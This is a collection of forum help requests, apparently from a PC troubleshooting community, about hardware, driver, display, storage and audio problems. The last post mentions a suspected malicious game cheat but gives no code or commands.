OS build is 19045.5440 (windows 10 pro). I have an AMD Ryzen 9 5900X 12-core processor (3.7 GHz), 32 GB of RAM, and a 64-bit OS/x64-based processor.\n\nThe 12 step seems to be showing up as a \"usb composite device\" in my windows device manager and I am getting a code 10 error saying that there are insufficient system resources to complete the API.\n\nI have done some googling and asked chat gpt for solutions pand ran through the suggested fixes:\n1. Shutdown/restart and tried connecting 12 Step before/after start-up.\n2. Checked for driver updates via device manager\n3. Manually reinstalled drivers\n4. Updated drivers for my AMD chip\n5. Turned off power saving mode in the properties of the usb driver\n6. I also made sure the 12 Step was connected directly to the PC, tried different usb ports and cables, and made sure I had version 3.05 of the editor software\n\nI also sent a request to the support team, but am not sure if they will be willing to help as I am outside of the warranty period. It feels like this is a simple driver issue, though, and should be an easy fix. The 12 step is working aside from this. I have been able to use it to controll hardware synths via midi and the bank selection/pads all work.\n\nAny other thoughts/suggestions on this? I am not well-versed in driver troubleshooting, so would appreciate any other ideas.\n\nThanks"

Maybe it didn't like that it was only one colored (red)?\n\nIt did turn on once during a POST... and then after a couple restarts, saw sparks (which resulted in the [picture here](https://i.imgur.com/SZouYPh.jpeg)), but then the strip actually starting working fine, ironically enough.\n\nOf course, I did power off right away and remove the LED strip, but everything seems to be working perfectly still, even the LED strip, which I tested outside the PC.\n\nSo, is this still safe to use? Just a short of the RGB fuse? I don't know if I'd be able to RMA it or not, but it should still be under warranty, I just don't want to be out a computer for a while.\n\nThank you for any input"

He said it might have been the nuclear option, but it worked lol\n\nI hope I chose the right flair for this, idk much of anything about computers.

No type bar for the pin, no power button options, nothing. So I did what I’ve seen him do (and I’ve done to my own) several times and press and hold the tower’s power button until it shut off. I let it sit for a solid ten seconds or more, and then fired it back up. Now both monitors are black, the primary will at least show the cursor, but the secondary has the blue loading wheel instead of the cursor.

Nothing seems to be working. \n\nI downloaded latencymon and when i ran the test is said my audio (Realtek HD) was producing high latency and i disabled, uninstalled the software, redownloaded it. It said my GPU kernel was causing high latency, did clean installs on that. Did not fix the issue. Now , it also said Microsoft storage port driver was causing high DPC latency issues. I had no idea what this was and some research as shown its tied to my SSD I have installed. \n\nCould it be that my M.2 is causing these stutters from having to read files from the OS while also having the game downloaded on the same storage device ? I have 1.5 tb of space available. Only games installed is RDR2 and Delta force at the moment. Does it seem reasonable to think if I get another SSD and dedicate just games on that one , it would alleviate my stutter issues ? I feel like that would give the games more breathing to run better.

This is my 5th PC build I have made so far in my life, and I have never seen something this weird with PC building.\n\nThis new PC was built last weekend. The BIOS has been updated to the latest version available on the Gigabyte website.\n\nGigabyte B650 AORUS ELITE AX V2 ATX AM5 Motherboard  \nTEAMGROUP MP44L 2TB SSD\n\nFor some weird reason, if I shutdown my PC and then restart, my SSD is not recognized by the BIOS. However, if I force a hard reset of the BIOS/CMOS (eg. removing the battery on the motherboard and put it back in), the SSD is recognized afterwards and everything works fine. It basically forces my computer to be on at all times, otherwise if I shut it down, I have to boot, see in the BIOS that the SSD is not recognized, shut it down again, unplug everything and remove the battery on the motherboard, put it back in, replug everything and then boot, the SSD is recognized and I can use my computer as normal.\n\nIt doesn't seem like my motherboard or my SSD is at fault. I tried to invert the components with my 5 year older PC (use the new SSD on the old motherboard, and the old SSD in the new motherboard) and both combinations work fine for detection and booting Windows. I'm trying to understand why it requires a hard BIOS/CMOS reset on the new motherboard to recognize the new SSD, when my old motherboard is able to recognize immediately the new SSD and boot with it.\n\nI was wondering if any of you have other clues of investigation so I can fix this problem. It's possible that one or both of the parts require RMAs, but as mentioned above, it doesn't feel like it's the issue since both parts were able to function with older counterparts.\n\nThank you!"

I barely know anything about computers so please don't be too harsh😅\n\nI bought hard disk with 1TB around 6 months ago so I can download more games. I had no problems playing any games, but they are not too demanding. I was playing phasmophobia and suddenly it was closing the game all the time by itself. I uninstalled it, thinking it was a game problem. But when I tried to download it again, it said something like \"disk crashed\". I couldn't open file explorer nor task manager, because everything was bugged and it said \"not responding\" for both which was weird. I asked my friend to help me and I unplugged the hard disk and plugged it again. Now I can go to the files and task manager and everything seems fine, but every game that is on the hard disk is awfully buggy and I can't play them. My friend told me to buy new SSD and I do plan to but I have to save money for it so I would want a temporary fix for this if it's possible.\n\nMy friend told me to download Crystal Disk Info and see what it says about my disk and I have two things that the app says are bad. \"Reallocated Sectors count\" and \"Current Pending Sector Count\" are yellow and it says caution. \n\nDoes anyone know If I can do anything until I buy a new disk or if this means the disk will die and should I move all my files somewhere else?\n\nThank you in advance"

I'm 99% sure that, initially, all the Contacts in my phone were transferred there from my prior phone...doing a 'smart swap' or whatever it's called.  Aside from that, I'm not sure if or how my Contacts on my phone may or may not be connected with my Contacts in my Google contacts.  Either way, I guess I assume that if I update a Contact on my phone, it will either sync/update that same Contact in my Google Contacts, or else it will simply update on my phone, but NOT change in Google Contacts.\n\nBut, regardless, I've recently noticed, and from time to time when looking up this Contact or that one, on my Phone, that a person's address info, for e.g., is suddenly 'gone'.  Their name and phone number are there, but any other info I previously had for them is gone.\n\nWhy might this be?  How might I try to get that info back?  \n\nAlso, and I'm not sure if this might be related but...  I also recently noticed that Text Messages that I am certain I deleted, RE-appeared in my list of Texts.  But not only that: lots of SPAM texts from over a year ago, and which I am certain never previously came through to me (as I would have remembered if so many 'spam' texts came to me) are also now appearing in my active list of texts.  What might be going on, to cause this? \n\nThank you!"

The seller was then informed by the supplier that there should be no coverage for instances like mine otherwise the supplier would deny any RMA to the seller.\n\nAs for context, my old unit had it’s PCIE connector burnt and thankfully my 3060 Ti was not affected. I summoned the RMA for it and since I was happy with the seller, I told him in person during the exchange that I tuned my gpu to undervolt with a slight overclock to make sure it runs at it’s best. Hence where I got the response above, from his supplier. This got me puzzled as to how my tuning can affect my PSU, especially when it is consuming less voltage and wattage…\n\nThis got me curious, as to:\n\n• How undervolting with an overclock can cause damage to the PSU\n\n• What parameters should I monitor to make sure this doesn’t happen again? i.e: Overloading the psu according to specs despite the tweaks my cpu and gpu are capable of handling.\n\nI do apologise if this seems to be common knowledge or so, I am truly puzzled and never been here before.

Pure Rock 2 FX\n• SSD: Kingston FURY Renegade with Heatsink\n• PSU: Gigabyte GP-UD1000GM PG5 2.0 (1000W)\n• RAM: Corsair DIMM 32 GB DDR5-6000\n• Monitor: Samsung Odyssey G5 - G55C\n\nThe Problem:\n• When I power on the PC, I get a VGA error LED on the motherboard, but I still get an image on the screen.\n• The screen shows the “New CPU installed” message, asking me to reset TPM or keep the old record.\n• If I press DEL or F2, it says “Entering Setup...” but stays stuck there for 20+ minutes.\n• GPU fans spin, so it seems to be getting power.\n\nWhat I’ve Tried:\n● Checked GPU is properly seated in PCIe slot.\n● Made sure the PCIe power cables are fully connected.\n● Tried booting with GPU and with HDMI plugged into motherboard (same issue).\n\n\n● Plugged monitor directly into GPU and into motherboard (same result).\n\nWhat I Haven’t Tried Yet:\n● Updating the BIOS (I’m not sure how, since I can’t access it).\n● Trying a different GPU (don’t have a spare one).\n● Reset CMOS (removed battery).\n● Tried different RAM slots and reseated RAM.\n\nCould this be a BIOS issue, or is my GPU/\nmotherboard faulty? Any ideas on how to get past the “Entering Setup” screen? Thanks in advance!"

I’ve had it for a couple years now, and i’ve had no problems whatsoever. A couple days ago, I decided to download Nvidia CUDA toolkit using the Nvidia cuda website to mess with AI GPU stuff, in the process I also downloaded the latest Nvidia graphics drivers. Now every time I boot it up it just boots to a gray screen, yup just a grey screen. I’m able to move my mouse around but it’s just the loading circle. Thankfully I’m able to get it to properly boot into safe mode, and from there i’m able to uninstall the graphics driver, which suddenly allows my pc to work again. Now here’s where i’m confused. I uninstalled, or at least i’m pretty sure, i uninstalled everything related to CUDA. So is it just an issue with the latest drivers themselves? I can’t imagine that it would be, but i also can’t imagine my GPU just one day decided to dislike drivers especially since it’s only a couple years old and is a 3060 ti. Right now, i’m going to make this post and go to bed. I have a feeling  someone’s going to say to uninstall an older driver, however, i have something i want to say to that. If i can, i’d like to avoid getting stuck on an older driver. if it’s just a temporary solution that’s fine, but for long term i’d really like to be able to just stick with the updates. If you need any more information, i can provide it to you, but i have to say that this really did just happen out of the blue. No i do not have a virus, no my graphics card does not appear to be failing, and yes my parts are compatible with one another. If i’m not using the right tags i apologize, if i’m not giving enough information i apologize, thank you."

            "description": "Alright, a few months ago, I helped a friend of mine pick a gaming laptop since I studied computer science. Yesterday, she called me because she spilled an energy drink on the keyboard—not a large amount, around 2 cm in diameter. She immediately unplugged everything, turned off the device, and wiped up the liquid with an absorbent towel.\n\nIt's an MSI Thin 15 B12VE-1490XES 15.6\" FHD 144Hz, i5-12450H, RTX 4050. I saw that MSI keyboards are generally spill-resistant. She also mentioned that no additional liquid spilled onto the table, so there was no chance of it seeping in through the vents underneath the laptop.\n\nI cleaned the keyboard with a microfiber cloth, cotton swabs, and 99.99% isopropyl alcohol (and while I was at it, I cleaned the screen with a mop cloth and screen cleaner). We opened the laptop despite the warranty because, in case of liquid damage, it wouldn't be covered anyway.\n\nI unplugged the battery (it could be removed, but it's one of those glued-in ones, not screwed in). I cleaned everything, including the dust, and used cotton swabs and isopropyl alcohol on the motherboard to ensure no liquid remained.\n\nNow, we’re letting it dry, and I told her not to turn it on for at least 72 hours. She leaved it in a dry place, propped up in a V-shape with the screen facing down so any remaining liquid can drain out. We placed paper towels underneath.\n\nShe told me that when the spill happened, the laptop didn’t turn off or short-circuit; it kept running, and she manually forced the shutdown. Inside, I didn’t see any moisture on the motherboard—the only thing that worries me is whether any liquid or condensation might have remained between the keyboard and the board.\n\nI fear now that there could be some condensation in the gaps between the keyboard keys and mobo. Maybe try to separate the whole keyboard (mobo dissasembly required) and try to dry out the membrane and keyboard also?\n\nAlso checked the power adapter with a polymeter, Worked just fine.\n\n  \nGot any other suggestions here? Thanks in advance"

I uninstalled both, deleted the \\_classic\\_ and \\_classic\\_era\\_ folders. Reinstalled classic\\_era. now no longer having any crashes. I suspect a model file became corrupt when the game crashed for the first time. this model asset must have been shared between the games hence got the same crash in both.\n\nhow do i change flare to fixed | software?\n\nHi All,\n\nI suspect my GPU might be on its way out but I'm having a hard time confirming as only World of Warcraft classic causes the crash. I'm looking for ideas on more tests i can do or just a plain \"yeah its dying\" comment from those who have seen something like this before.\n\nSTRIX-570-E  \nAMD 5700X3D  \nAMD XFX 6950XT  \n850W PSU  \nCustom loop cooling\n\n2 days ago it was hot, playing WoW Classic Hardcore and about 5 hours in. Walked into a new zone and both my screens went black but audio still played. Rebooted and only the second screen was showing and AMD adrenaline driver would not launch. Either had to run display driver uninstaller and reinstall or disable then enable the GPU from device manager. Every time i launched WoW Classic Hardcore and logged in, i was met with the same fate mostly instantly but sometimes would take up to 30 seconds.\n\nStrangely, i was able to play a full hour of Helldivers 2, half an hour of Spacemarine 2, and half an hour of Retail World of Warcraft without any issue. I also ran the FURMARK GPU stress test without any issue. although i noticed that the coilwine was louder than i remember when the GPU got to 1.2V on the cores.\n\nI've tried the following:  \n\\- reinstalling drivers  \n\\- installing older drivers  \n\\- closed on-screen display applications like steam and discord  \n\\- re-installed WoW Classic  \n\\- Disabled in game addons  \n\\- Changed to DX11 (seemed to make it more stable but still crashed after 5 or so min)  \n\\- removed memory overclock from BIOS  \n\\- change GPU display ports  \n\\- ran the game on the second monitor only (didnt crash from 10 minutes in WoW Classic)  \n\\- ran the game on the first monitor only (didnt crash from 10 minutes in WoW Classic)\n\nOne thing i have found which makes it more stable is dropping my GPU voltage from 1.2V to 1.1V. if i launch the game with this change then i do not get the crash. if i then remove the undervolt while in game, then go back to character select screen, then go back into the game, it crashes almost straight away.\n\ni find it strange that its only WoW Classic which causes the issue. No other game or benchmark causes the crash. I'm hoping its a its a software issue because its limited to one game, but the fact that under-volting and reducing to one screen made it more stable has me concerned its the GPU dying.\n\nI've got an old VEGA64 on a waterblock that i will put in later this week. It's a bit of effort to drain the loop so i was looking for any other suggestions, or just tell me its dying. thanks!"

I had LiveKernalEvent code 1c5 and Blue Screen code 133 upon restart. Only happened about an hour after updating to this driver. This is an RTX gaming laptop, Legion 7i Gen 8 with 4090. Not sure what’s going on but it’s the first BSOD I’ve had since owning this laptop. I’ve had other issues such as artifacts but only on the higher resolution external monitor in some games, so it makes me wonder if the GPU is on its way out. Anyone else having this problem since the driver update? And maybe specifically these error codes in this usage pattern?"

While troubleshooting, I accidentally configured my laptop to output only to a second screen when the tablet is plugged in. I thought I disabled this setting quickly, but I didn't, and now both screens go black when the tablet is connected, even though they're powered on. This makes it impossible to see what I'm doing. Am I going to have to reset my PC? I can't find any other solution. I'm also unsure why the tablet screen initially stopped displaying; the power light is on, and the pen works, but there's no image. The only thing I did before the screen went blank was close Discord using Task Manager. Any advice on how to fix either would be greatly appreciated but if a rest is the answer it's the answer Also, if I choose to reset my laptop but keep my files, how does the boot-up process work afterwards? Like does my password still stay the same? Am I still login into Microsoft? Or will I have to set all of that up?"

Nothing too out of the ordinary, years back I would occasionally have to unplug/replug my keyboard for whatever weird reason. After a short while the keyboard stopped working again so I decided to try and restart my pc but when I went to log back in the keyboard again was not working, so I tried the fix again, you guessed it still no luck. Pulled up screen keyboard to login and try to relaunch synapse (sometimes that fixes it) no luck. So another restart later and now not only does my keyboard not work but my mouse won’t register either!!! \n\nThing is I know they both still work, and that the USB ports aren’t dead or anything because they both function in the bios menu as well as windows startup repair menu. I have spent hours trying various fixes from safe mode to resetting the cmos. Unfortunately I forgot the password for my local account (tried resetting on another device but suspect local password storage) so windows won’t let me use most of the startup repair features like safe point restore or cmd prompt. \n\nI’ve rebooted too many times to keep track of and occasionally get a “BOOTMGR CORRUPT” error when going through the cycle. But invariably I hard shutdown and start back up it boots right back into windows. MnK still non functional. \n\nAfter doing LOTS of digging the likely suspect is a bad usb driver somewhere but without a mouse or keyboard I can’t even get past the login screen let alone navigate to a repair tool. \n\nThe only thing I have found that may fix the issue is a full reinstall of windows, and I’d really prefer not to go that route if at all possible. \n\nAlso the SSD I’m using for the boot drive is about 5 years old and has seen some heavy use… If it were failing would that cause the issue?\n\nJust to reiterate neither mouse nor keyboard function at all in safe mode either. \n\n\nSpecs:\nROG Corsair Hero VII (WiFi)\nRyzen 7 5700x3d \nRTX 4070TiS"

Since arrival, I’ve noticed a slight earth leakage issue—I can feel electricity on the metal body while charging. However, I didn’t think much of it at the time.\n\nRecently, I replaced the HDD with an SSD and have been using the HDD externally via an enclosure. Now, whenever I connect the HDD to one of my USB-A ports, it messes with the WiFi (frequent disconnections or failure to connect) and causes severe lag in my mouse, which is connected to the other USB-A port. While the HDD is running, the mouse becomes nearly unusable.\n\nIt’s not just the HDD—I also tested a mobile phone and an external 256GB SSD, and they caused similar issues. However, when I use a different USB port, everything works fine, and the touchpad remains unaffected no matter what device is connected.\n\nAnother issue is that when I type on the keyboard, touch the laptop, or slightly move it, both USB devices disconnect. Interestingly, the USB-C port remains unaffected by all of these issues.\n\nAdditionally, I’m experiencing audio noise in speakers connected via the 3.5mm jack, which are powered by the laptop’s USB. The noise gets even worse when the external HDD is connected, suggesting possible power or interference issues.\n\nCan someone please help me diagnose and fix these issues? Also, would you recommend changing the thermal paste since it's been almost seven years?"

            "description": "I have a Dell XPS 13 7390, from 2019. This is the first time I've taken apart my laptop. Fan has been noisy for around a week and a half, so watched a youtube tutorial and opened it up to replace the fan. I disconnected the battery before doing anything, so I hope shorting isn't one of the possible issues\n\nPressing the power button lights up the keyboard backlight and the power indicator white, no blinking or any orange. Monitor doesn't show the startup logo, and everything turns off after about 5 seconds. Holding down the power button does the same thing. Plugging in the charger doesn't change anything. Nothing in the internals looks visibly damaged.\n\nHopefully this will help to narrow down whatever problem I might be having:\n\n• While I was replacing the fan I'd accidentally disconnected a connector to the left of it (no pics in this sub, google my laptop model internals and it's the one with two fans directly next to each other) underneath is labeled \"B L:CCD\". put it back as I was reassembling everything before connecting the battery again.\n\n• There's the possibility that I damaged something through static unknowingly... if I did it wasn't strong enough for me to feel anything. If this is the case is there a fix?\n\n• I had to disconnect the heatsink to replace the fan, anything to do with thermal paste that would prevent startup?\n\n• Laptop was working completely fine before this, shut it down before I did anything. No previous issues with the battery or charger.\n\nI could bring it to a repair shop. I bought this laptop refurbished in 2021 for cheap, if it's an expensive fix I'd rather spend a bit more to get something better"

So at the end of January I bought a ps5 pro and an xr80 Sony TV to get the best out of the console, it works great but pretty much since the first days I noticed a loud distorted sound coming from the TV while playing Naraka on HQ or Marvel Rivals on HFR mode. The noise is random so that after purchasing a new hdmi ultra high speed cable I thought that solved it however tonight I noticed the same noise during a fight. Sometimes it's in the lobby and it doesn't even need high pitch sounds or loud music to happen.\nI have adjusted sound features either on the TV and console, sound is PCM I deactivated Dolby and dts. Switched the cable to the arc/earc entrance, noise happens on either of both 2.1 hdmi ports. \nBought new 2.1 hdmi cable. \nUnplugged ethernet cables from TV and ps5 pro and switched to wireless (modem is very close but it never affected on old fat ps5). \nSwitched ps5 pro to my rooms tv which is a simple Daewoo TV I just use for movies, to see if the distortion happened and it didn't make a single noise. \nSame when I plugged my old ps5 to the xr80 TV, gave me nothing.... \nAnyway please help if anyone got ideas I would really appreciate it. \nThanks in advance.

Of course I did all the speed testing and modem resets, /release, /renew, etc. to no avail.   \nHOWEVER  \nwhen i restart the computer... upon startup it will relaunch Opera GX, if there's a video to resume at launch (in the tab it starts on) it will play all the way through, subsequent videos too...

I went this past weekend with absolutely no issues, but they came back today, and I've just about had it.\n\nThings that have (inconsistently) triggered total sound death:  \n\\+ un/plugging headphones, both AUX and USB-C\n\n\\+ closing a window whilst audio is playing.\n\n\\+ in discord, switching away from a channel playing audio.\n\n\\+ not having audio playing at all times, by which I mean my audio completely dies if there isn't something playing audio. I had some YT audio in the BG, and when it ended, I clicked on another video only for my sound to be gone. Again. \n\nRunning the Windows 11 sound troubleshooter rarely turns up an issue, though usually restarting my laptop afterwards does the trick. On occasion it claims there's an issue with my audio driver being outdated, but then it tries to update it and nothing gets fixed! And I've gone into the device manager and done all the clicks and checks there -- everything is purportedly up to date and also the correct driver for my device. I haven't been messing with or downloading and installing/uninstalling any drivers, so that part of the troubleshooter is totally useless. I'm at a total loss of what to do or what solutions to try, and I refuse to try the Microsoft support page because it seems like their team never actually provides people with what the problem is, and what the solution might be."

It'll just hang forever. I've even waited an hour to see if it was just AM5 RAM training.)  \nPSU: 850W Corsair power supply\n\nI've been fighting for around two weeks to try and resolve this issue. I was on Windows 10 when I was force-updated to Windows 11 (and consequently my drivers). This came with all sorts of issues, as now I'd get Event 0/13/14/153 crashes in my Event Viewer. This occurs randomly (in and out of games). The crashes will cause a black screen (not BSOD), attempt to re-boot, and then hang forever. When reset, horizontal green lines/floating green pixels will appear. I've done a lot of research as to why this occurs. Allegedly it's due to Nvidia's newer drivers past version 531 being incompatible with WIndows 11 ver. 24H2. Regardless of whether or not that's entirely true, I have tried the following:\n\n\\-Reseat RAM  \n\\-Reseat GPU  \n\\-Tried a different HDMI cord  \n\\-Tried a different HDMI port on the GPU  \n\\-Enable full permissions for Users in the Nvlddmkm.sys security settings  \n\\-Turned off fast boot  \n\\-Ran DDU in safe mode and re-installed 531.61  \n\\-Used MSI afterburner to underclock GPU+RAM by 50mhz each  \n\\-Disabled Windows' auto-update driver feature  \n\\-Verify PSU connections  \n\\-Temporarily disabled NZXT CAM  \n\\-Ran the corruption scan command in cmd prompt  \n\\-Disabled HAGS  \n\\-Turn on Debug mode in the Nvidia Control Panel  \n\\-Tweaked power settings in Nvidia Control Panel  \n\\-Tried low latency mode in Nvidia Control Panel  \n\\-Added a TdrDelay in Registry editor  \n\\-Installed LatencyMon software to try and view Highest Reported DPC routine execution time to look for high Nvlddmkm latency spikes  \n\\-Disabled XMP/EXPO in BIOS\n\nThe last non-hardware fix I'm thinking is a BIOS update, but I've been told some of the newer MSI B650 BIOS patches are unstable and come with their own set of issues.\n\nThis issue has an insanely large scope. Different forums I've read through showed people solving this issue in different ways. What I want to ask is whether it's time to start replacing hardware, and where I would start. Any and all help would be appreciated. Thank you for your time."

            "description": "I have a Gigabyte Aorus 5SE 4 laptop. When I bought it, it had 16 GB (2x8) DDR4 Crucial 3200MHz CL22 SO-DIMM RAM. I wanted to upgrade my RAM capacity so I bought a 64 GB (2x32) DDR4 G.Skill Ripjaws 2666 MHZ CL18 SO-DIMM RAM. When I install the RAM module BIOS only detects the size of each stick to be 4 GB each for a total of 8GB. Can you guys help with this issue?\n\nI checked online in their website before buying to see what’s the max mem size the laptop supports: website said “2x DDR4 slots (DDR4-3200, Max 64GB)”\n\nMy leading suspicions are:\n1. Amazon sold be a scam ram which on the sticker says 2x32 GB kit but is actually only 2x4. \n2. My MoBo maybe a problem. \n3. BIOS not updated issue.\n\nThe things I have tried:\n1. Use only one memory stick in a slot on =&gt; only reports 1 stick of 4GB size. Tried all combinations Stick A slot A Stick B Slot A etc (not actual slot or stick numbers just naming them)\n\n2. Tried updating the BIOS from the trash and stupid software they ship with their system =&gt; that shit didn’t even show if it had any updates.  \n2.1 So I tried to get the bios from their website where according to it the bios date is Feb 06 2023 but after downloading and flashing it, it remained in the original date Dec 13 2022. \n\nSolutions I could try:\n1. Transplant this RAM onto an another laptop and check if it works but I don’t know if I can find another laptop to test. So not sure about the viability. \n\n2. Return the RAM and get another one and try again. Just want to exhaust all options before this. \n\n3. Get a local repair shop to take a look at it (I don’t have the money 😭) \n\n4. Actually raise an RMA to gigabyte and maybe get a fix? I hate this idea as that’d mean my laptop is out for a long time. (And again no money 😭)\n\nThanks in advance!"

What should I do now? Can I make fixes to the offbrand charger to somehow fix this issue? I get that the easiest choice is to buy a genuine charger, but I live in a third world country where genuine products are quite expensive. \n\n  \nIf it really turns out that I have to replace the charger, I would at the very least like the peace of mind that it won't do much harm towards the laptop while I ask for a replacement."

I do have m365 backups with snapshots 1x a day since before I took the picture.\n\nI've looked at all the pics on my PC / onedrive and it's not on the computer, best I can tell.\n\nI'd like to see if there's a way to somehow export all the pics that have ever existed across all the snapshots of my onedrive.\n\nI would then compare that long list of files against the files currently on onedrive and delete the dupes from the recovery (based on name matches). Then look at all the remaining files in that recovery folder for the missing picture. From what I am seeing, I need to do that with a specific snapshot at a time.\n\nIf I do that with snapshots from 1-1-xx of each year for the last 10? years, that will take lots of time.\n\nAnd conceivably, the picture was taken and deleted within a single year. So the deleted picture won't be on the snapshots on the start or end of the year.\n\nAnd it brings up the point - how do you recover a file if you don't know when it was created or deleted?! You just know it did exist on the drive for some amount of time (being a picture, it just has the standard iphone naming format - date time.jpg nothing to search on file name. And being a picture, can't even search inside the file for specific text, like you could with a word / text document.\n\nI would expect it has GPS info since it was taken by an iphone. But backup services (my data is on datto and cloudally) don't let you search / recover on GPS metadata as far as I know.\n\nAny thoughts?"

Here's my situation:\n\n- I game on my PC, which has no sensitive files and I live alone.\n- I prefer using a local Windows account without any login requirements, so my PC can boot up and be ready to use without any prompts.\n\nOn my MacBook, I use 1Password as my password manager and unlock it effortlessly with my fingerprint. I want the same convenience on my PC, but 1Password doesn't support PIN unlocking. My plan is to buy a cheap fingerprint scanner from AliExpress and set up Windows Hello so I can unlock 1Password with my fingerprint.\n\nHowever, I want to avoid being forced to use Windows Hello, a PIN, or a password to unlock my PC itself. Is it possible to set up Windows Hello only for 1Password without changing my current login setup?\n\nI am on windows 11 pro and i'm willing to make registry edits.\n\nAny advice or insights would be greatly appreciated!

Today, my computer randomly started restarting, seemingly for an update, but it took very long, around 2 hours. Once it opened I noticed that everything is running VERY slow. I eventually checked my file explorer and realized that my C drive turned back to my 1tb hdd for some reason and is booting windows from there. Now my SSD became my E drive, and for some reason the system F drive is now visible too.   \n\n\n**What I've tried :**   \n  \nI tried restarting my PC, but it still boots with my HDD as my C drive. So after that, I tried going into my bios to check my boot order, but whenever I try to go to my bios I get an infinite black screen and eventually have to power off my system. I tried swapping from display port to hdmi with no luck, and I also tried swapping from my 2 4k samsung monitors to my old 1080p element tv, but still no display. I've also tried checking msconfig to change boot order, but only my HDD shows up, not my ssd. At this point I have no idea what to do and I am considering trying a software called \"easyBCD\" which supposedly allows me to change my boot order. Any advice on what to do from here? Is there another way I can access my bios? Or is there a way for me to boot from my SSD again without accessing bios?

            "description": "Hey everyone,\n\nI’m experiencing some odd behavior with my setup and wanted to see if anyone else has encountered similar issues or has insights to share. Here’s the situation:\n\n**Setup:**\n\n* GPU: MSI RTX 5090 TRIO OC\n* Monitor: Samsung Neo G9 57\" (using the included DP cable, but also tested with a VERSA-certified DP80 cable)\n* Resolution/Refresh Rate: 7680x2160 @ 240Hz (10-bit) via DisplayPort 2.1\n\n**The Problem:**  \nWhen pushing the display to its full potential (7680x2160 @ 240Hz), the GPU behaves strangely:\n\n1. **Core Clock Drop:** At 240Hz, the GPU loses \\~100MHz core clock speed compared to running at 120Hz (which is achievable with DP1.4).\n2. **Instability Under Load:** In benchmarks like 3DMark Time Spy Extreme, the GPU crashes at 240Hz across multiple settings: MSI stock settings, Undervolt (2.7GHz @ 960mV), NVIDIA stock settings (via NVIDIA Control Panel debug mode). However, the benchmark runs fine at 3840x2160 @ 240Hz or 7680x2160 @ 120Hz. Interestingly, the benchmark itself runs at 3840x2160 in all cases, so the display resolution/refresh rate seems to be the variable causing instability.\n3. **Performance Drop:** In regular Time Spy, running the display at 7680x2160 @ 240Hz results in a \\~7k lower score compared to running it at 3840x2160 @ 240Hz, even though the benchmark resolution is the same in both cases.\n4. **Artifacts/Glitches:** When the GPU is idling at low clocks (not set to \"maximum performance\"), I experience artifacts and glitches on the desktop. With \"maximum performance\" enabled, these issues only occur during sudden GPU load spikes (e.g., launching a game or starting a GPU-intensive task). These problems disappear at lower refresh rates or resolutions.\n\n**Observations from GPU-Z:**\n\n* **DP1.4 Mode:** Bandwidth reporting looks normal.\n\nhttps://preview.redd.it/98mvqfp0o0he1.png?width=948&amp;format=png&amp;auto=webp&amp;s=f530bc9217dd5bf898fab6ffccaf491c7564da4c\n\n* **DP2.1 Mode:** The reported bandwidth seems incorrect (see screenshots below). It feels like the GPU is struggling to handle the full DP2.1 bandwidth, leading to instability even at stock settings.\n\nhttps://preview.redd.it/d9lnm7h1o0he1.png?width=943&amp;format=png&amp;auto=webp&amp;s=212f8d95b899a7c4287603bbf5bfcecea3be729d\n\n**My Theory:**  \nIt seems like the RTX 5090’s DP2.1 implementation might be under stress when fully utilized, causing instability. Alternatively, there could be an issue with the monitor or the GPU’s DisplayPort firmware. I’m hoping it’s not a hardware defect, but I’m not ruling anything out yet.\n\n**What I’ve Done So Far:**\n\n* Contacted NVIDIA Support, but their solutions so far have been generic (basic troubleshooting steps).\n* Tested with two different DP cables (included Samsung cable and a VERSA-certified DP80 cable), with identical results.\n\n**Questions for the Community:**\n\n1. Is anyone else running a similar setup (RTX 5090 + Samsung Neo G9 57\" or another DP2.1 display) and experiencing similar issues?\n2. Has anyone successfully pushed a DP2.1 display to its full bandwidth without stability problems?\n3. Any suggestions on how to diagnose whether this is a GPU, monitor, or firmware issue?\n\nI’d really appreciate any advice or shared experiences. I’m trying to figure out if this is a widespread issue, a defect, or just a quirk of the hardware. Thanks in advance!\n\nEdit: Just received a hotfix driver update from the Nvidia Customer Support. \n\nReduced coil whine, same clock speed for 7680x2160 and 3840x2160. 3DMark TimeSpy Extreme GPU Test 2 runs fine without crashing on 7680x2160. Clocks and score like manufacturer settings expected. Feels like less artifacts are happening when GPU starts with workload, so for example game starting.  \nOnly had 1 crash so far during 3DMark TimeSpy Extreme stress test, was a black screen crash and not a grey screen with blue lines. Furmark with maxed GPU usage runs fine and voltages are more stable.  \nGPU-Z still reporting wrong bandwith when using DP2.1 connection."

So, I went and made a boot usb to repair the windows boot. Got back into it and immediately went to downloads and saw the last thing that was downloaded was this 'cheat' a month ago. So, before I even started working on the computer to get it back working, I asked him what he did and he was like 'nothing' haha like any teenager. Once I saw the download I asked him did it just magically stop working after this 'cheat' was downloaded. He was like yeah now that you mention it....\n\nAnyway, I got to looking into it and I noticed the 'cheat' had a uninstall feature in the program files folder for it but it was a shortcut not a normal uninstall exe that you would find in the program files. When I told it to go to the file location it brought up 'msiex\\_ec.exe' in the \"windows\\\\system32\" directory. So, my guess is they do something to your computer to break it once you go to 'uninstall' the cheat.
